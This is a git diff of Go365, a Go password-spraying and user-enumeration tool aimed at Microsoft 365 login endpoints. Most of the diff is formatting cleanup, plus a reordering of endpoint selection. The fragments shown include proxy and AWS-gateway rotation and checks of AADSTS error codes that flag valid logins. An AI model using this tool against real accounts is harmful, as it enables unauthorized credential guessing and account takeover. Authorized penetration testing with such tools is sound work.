@@ -9,9 +9,11 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
 */
 package main
+
 import (
 	"bufio"
 	"bytes"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -20,18 +22,20 @@ import (
 	"os"
 	"strings"
 	"time"
-	"encoding/json"
+
 	"github.com/beevik/etree"
 	"github.com/fatih/color"
 	"golang.org/x/net/proxy"
 	//"crypto/tls"                     uncomment when testing through burp + proxifier
 )
+
 var (
-	targetURL = ""
-	targetURLrst2 = "https://login.microsoftonline.com/rst2.srf"
+	targetURL      = ""
+	targetURLrst2  = "https://login.microsoftonline.com/rst2.srf"
 	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
-	debug     = false
+	debug          = false
 )
+
 const (
 	version = "1.4"
 	tool    = "Go365"
@@ -128,11 +132,13 @@ const (
   ██████   ████  ██████   ██████  ██████
 `
 )
+
 // function to handle wait times
 func wait(wt int) {
 	waitTime := time.Duration(wt) * time.Second
 	time.Sleep(waitTime)
 }
+
 // funtion to randomize the list of proxy servers
 func randomProxy(proxies []string) string {
 	var proxy string
@@ -141,23 +147,25 @@ func randomProxy(proxies []string) string {
 	}
 	return proxy
 }
+
 type flagVars struct {
-	flagHelp              bool
-	flagEndpoint          string
-	flagUsername          string
-	flagUsernameFile      string
-	flagDomain            string
-	flagPassword          string
-	flagPasswordFile      string
-	flagUserPassFile      string
-	flagDelay             int
-	flagWaitTime          int
-	flagProxy             string
-	flagProxyFile         string
-	flagOutFilePath       string
-	flagAWSGatewayURL     string
-	flagDebug             bool
+	flagHelp          bool
+	flagEndpoint      string
+	flagUsername      string
+	flagUsernameFile  string
+	flagDomain        string
+	flagPassword      string
+	flagPasswordFile  string
+	flagUserPassFile  string
+	flagDelay         int
+	flagWaitTime      int
+	flagProxy         string
+	flagProxyFile     string
+	flagOutFilePath   string
+	flagAWSGatewayURL string
+	flagDebug         bool
 }
+
 func flagOptions() *flagVars {
 	flagHelp := flag.Bool("h", false, "")
 	flagEndpoint := flag.String("endpoint", "rst", "")
@@ -176,21 +184,21 @@ func flagOptions() *flagVars {
 	flagDebug := flag.Bool("debug", false, "")
 	flag.Parse()
 	return &flagVars{
-		flagHelp:           *flagHelp,
-		flagEndpoint:       *flagEndpoint,
-		flagUsername:       *flagUsername,
-		flagUsernameFile:   *flagUsernameFile,
-		flagDomain:         *flagDomain,
-		flagPassword:       *flagPassword,
-		flagPasswordFile:   *flagPasswordFile,
-		flagUserPassFile:   *flagUserPassFile,
-		flagDelay:          *flagDelay,
-		flagWaitTime:       *flagWaitTime,
-		flagProxy:          *flagProxy,
-		flagProxyFile:      *flagProxyFile,
-		flagOutFilePath:    *flagOutFilePath,
-		flagAWSGatewayURL:  *flagAWSGatewayURL,
-		flagDebug:          *flagDebug,
+		flagHelp:          *flagHelp,
+		flagEndpoint:      *flagEndpoint,
+		flagUsername:      *flagUsername,
+		flagUsernameFile:  *flagUsernameFile,
+		flagDomain:        *flagDomain,
+		flagPassword:      *flagPassword,
+		flagPasswordFile:  *flagPasswordFile,
+		flagUserPassFile:  *flagUserPassFile,
+		flagDelay:         *flagDelay,
+		flagWaitTime:      *flagWaitTime,
+		flagProxy:         *flagProxy,
+		flagProxyFile:     *flagProxyFile,
+		flagOutFilePath:   *flagOutFilePath,
+		flagAWSGatewayURL: *flagAWSGatewayURL,
+		flagDebug:         *flagDebug,
 	}
 }
 func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute) {
@@ -331,13 +339,13 @@ func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) 
 	xmlResponse := etree.NewDocument()
 	xmlResponse.ReadFromBytes(body)
 	//// Read response codes
-     // looks for the "psf:text" field within the XML response 
+	// looks for the "psf:text" field within the XML response
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
 		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
 		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
 	} else if strings.Contains(x.Text(), "AADSTS50059") {
-		// if the domain is not in the directory then exit 
+		// if the domain is not in the directory then exit
 		fmt.Println(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
 		os.Exit(0) // no need to continue if the domain isn't found
 	} else if strings.Contains(x.Text(), "AADSTS50034") {
@@ -505,6 +513,22 @@ func main() {
 
 		outFile.WriteString(strings.Join(os.Args, " ") + "\n")
 	}
+
+	// -endpoint
+	if opt.flagEndpoint == "rst" {
+		fmt.Println("Using the rst endpoint...")
+		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
+		targetURL = targetURLrst2
+	} else if opt.flagEndpoint == "graph" {
+		targetURL = targetURLgraph
+		fmt.Println("using the graph endpoint...")
+		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
+	} else {
+		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph")
+		fmt.Printf("%s\n", usage)
+		os.Exit(0)
+	}
+
 	// -url
 	if opt.flagAWSGatewayURL != "" {
 		targetURL = opt.flagAWSGatewayURL
@@ -522,20 +546,7 @@ func main() {
 			_ = resp
 		}
 	}
-	// -endpoint
-	if opt.flagEndpoint == "rst"{
-		fmt.Println("Using the rst endpoint...")
-		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
-		targetURL = targetURLrst2
-	} else if opt.flagEndpoint == "graph" {
-		targetURL = targetURLgraph
-		fmt.Println("using the graph endpoint...")
-		fmt.Println("If you're using an AWS Gateway (recommended), make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
-	} else {
-		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph")
-		fmt.Printf("%s\n", usage)
-		os.Exit(0)
-	}
+
 	// -debug
 	debug = opt.flagDebug
 	//// Finally it starts happening
@@ -576,7 +587,7 @@ func main() {
 				// Write to file
 				if opt.flagOutFilePath != "" {
 					outFile.WriteString(result + "\n")
-				}	
+				}
 				// Wait between usernames
 				if j < len(usernameList)-1 {
 					wait(opt.flagWaitTime)
